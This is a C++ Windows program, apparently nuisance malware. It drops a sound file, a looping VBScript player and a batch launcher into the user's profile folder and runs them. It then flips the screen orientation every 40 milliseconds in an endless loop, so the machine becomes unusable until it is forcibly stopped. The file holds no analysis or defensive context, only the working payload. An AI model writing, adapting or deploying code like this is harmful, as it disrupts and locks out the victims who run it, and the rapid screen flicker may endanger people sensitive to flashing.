#include "proc.h"

using namespace std;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    ExtractResource(101, getenv("USERPROFILE") + string("\\cure.wav"), "WAVE");
    
    ofstream outfile(getenv("USERPROFILE") + string("\\cure.vbs"));
    outfile << "Dim oPlayer\nSet oPlayer = CreateObject(\"WMPlayer.OCX\")\noPlayer.URL = \"" + string(getenv("USERPROFILE")) + "\\cure.wav\"\noPlayer.controls.play\noPlayer.settings.setMode \"loop\", True\nWhile oPlayer.playState <> 1 \nWScript.Sleep 100\nWend\noPlayer.close" << endl;
    outfile.close();

    ofstream outfile2(getenv("USERPROFILE") + string("\\cure.bat"));
    outfile2 << "@echo off\nstart %userprofile%\\cure.vbs\nexit" << endl;
    outfile2.close();

    system("start %userprofile%\\cure.bat");

    Sleep(1300);
    ScreenPayload();
}

void ScreenPayload()
{
    DEVMODE mode;
    EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &mode);

    while (true)
    {
        mode.dmDisplayOrientation = DMDO_180;
        ChangeDisplaySettings(&mode, 1);
        
        Sleep(40);
    
        mode.dmDisplayOrientation = DMDO_DEFAULT;
        ChangeDisplaySettings(&mode, 1);
    }
}

bool ExtractResource(std::uint16_t ResourceID, std::string OutputFileName, const char* ResType)
{
    try
    {
        HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(ResourceID), ResType);
        if (hResource == nullptr)
        {
            return false;
        }

        HGLOBAL hFileResource = LoadResource(nullptr, hResource);
        if (hFileResource == nullptr)
        {
            return false;
        }

        void* lpFile = LockResource(hFileResource);
        if (lpFile == nullptr)
        {
            return false;
        }

        std::uint32_t dwSize = SizeofResource(nullptr, hResource);
        if (dwSize == 0)
        {
            return false;
        }

        HANDLE hFile = CreateFile(OutputFileName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        HANDLE hFilemap = CreateFileMapping(hFile, nullptr, PAGE_READWRITE, 0, dwSize, nullptr);
        if (hFilemap == nullptr)
        {
            return false;
        }

        void* lpBaseAddress = MapViewOfFile(hFilemap, FILE_MAP_WRITE, 0, 0, 0);
        CopyMemory(lpBaseAddress, lpFile, dwSize);
        UnmapViewOfFile(lpBaseAddress);
        CloseHandle(hFilemap);
        CloseHandle(hFile);

        return true;
    }
    catch (...) {}
    return false;
}